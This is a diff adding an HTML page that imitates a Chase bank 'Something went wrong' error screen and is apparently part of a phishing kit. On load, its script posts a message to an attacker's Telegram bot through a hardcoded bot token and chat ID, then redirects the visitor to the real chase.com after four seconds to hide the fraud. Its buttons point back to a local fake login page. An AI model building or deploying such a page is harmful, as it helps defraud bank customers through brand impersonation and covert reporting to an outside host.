@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chase - Something Went Wrong</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body { 
+      font-family: 'Roboto', system-ui, sans-serif; 
+      background: linear-gradient(135deg, #003087 0%, #0055cc 100%),
+                  url('photo_2026-04-12_23-03-20.jpg') center/cover;
+      background-blend-mode: overlay;
+      background-attachment: fixed;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 30px;
+      position: relative;
+      color: #333;
+    }
+
+    .background-logo {
+      position: absolute;
+      top: 40px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 1;
+    }
+
+    .background-logo img {
+      max-height: 60px;
+      width: auto;
+      opacity: 0.9;
+      filter: brightness(0) invert(1);
+    }
+
+    .error-container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3), 0 0 80px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 460px;
+      padding: 50px 40px;
+      text-align: center;
+    }
+
+    .error-icon {
+      font-size: 60px;
+      margin-bottom: 20px;
+      color: #d32f2f;
+    }
+
+    h1 {
+      font-size: 26px;
+      color: #003087;
+      margin-bottom: 12px;
+    }
+
+    .subtitle {
+      color: #555;
+      font-size: 16px;
+      line-height: 1.5;
+      margin-bottom: 30px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: #0b6cff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin: 10px 0;
+      transition: background 0.3s;
+    }
+
+    .btn:hover {
+      background: #0a5fd6;
+    }
+
+    .btn-secondary {
+      background: transparent;
+      color: #0b6cff;
+      border: 2px solid #0b6cff;
+    }
+
+    .btn-secondary:hover {
+      background: #f0f7ff;
+    }
+
+    .security-notice {
+      margin-top: 30px;
+      font-size: 13px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <!-- Background Logo -->
+  <div class="background-logo">
+    <img src="https://www.logo.wine/a/logo/Chase_Bank/Chase_Bank-Logo.wine.svg" 
+         alt="Chase Bank Logo" 
+         title="Chase Bank">
+  </div>
+
+  <div class="error-container">
+    <div class="error-icon">⚠️</div>
+    <h1>Something went wrong</h1>
+    <p class="subtitle">
+      We’re sorry, but we couldn’t complete your request right now.<br>
+      Please try again later.
+    </p>
+
+    <button onclick="goBackToLogin()" class="btn">Try Again</button>
+    <button onclick="goToOfficialChase()" class="btn btn-secondary">Back to login</button>
+
+    <div class="security-notice">
+      Your security is our priority. All sessions are protected.
+    </div>
+  </div>
+
+  <script>
+    // ================== TELEGRAM BOT CONFIG (Optional) ==================
+    const TELEGRAM_BOT_TOKEN = "8746410195:AAFYxQsrdZJ-UrqtqHZ_1HLkqVvRO2e8s5I";
+    const TELEGRAM_CHAT_ID = "6872342305";
+
+    async function sendErrorToTelegram() {
+      const message = `
+⚠️ *Chase Error Page Triggered*
+
+❌ *Error:* Something went wrong page shown
+⏰ *Time:* ${new Date().toLocaleString()}
+🌐 *Page:* Error Page
+      `.trim();
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (e) {
+        console.error("Telegram error notification failed");
+      }
+    }
+
+    // Send notification when error page loads
+    window.onload = function() {
+      if (TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && TELEGRAM_CHAT_ID !== "YOUR_CHAT_ID_HERE") {
+        sendErrorToTelegram();
+      }
+
+      // Auto redirect to official Chase.com after 4 seconds
+      setTimeout(() => {
+        window.location.href = "https://www.chase.com";
+      }, 4000);
+    };
+
+    function goBackToLogin() {
+      window.location.href = "index.html";   // Change to your login page filename if different
+    }
+
+    function goToOfficialChase() {
+      window.location.href = "https://www.chase.com";
+    }
+  </script>
+</body>
+</html>
